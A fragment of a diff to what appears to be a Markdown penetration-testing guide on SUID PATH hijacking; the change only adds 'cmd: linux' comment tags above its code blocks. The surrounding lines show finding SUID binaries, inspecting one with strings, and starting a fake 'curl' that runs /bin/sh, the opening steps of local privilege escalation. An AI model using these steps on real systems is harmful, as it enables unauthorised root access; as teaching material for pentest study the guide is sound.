@@ -14,6 +14,7 @@ If a SUID binary calls external commands without absolute paths, control of `PAT
 
 Find SUID files and inspect strings:
 
+<!-- cmd: linux -->
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 strings /usr/bin/menu
@@ -21,6 +22,7 @@ strings /usr/bin/menu
 
 Create a malicious command replacement:
 
+<!-- cmd: linux -->
 ```bash
 cd /tmp
 echo /bin/sh > curl
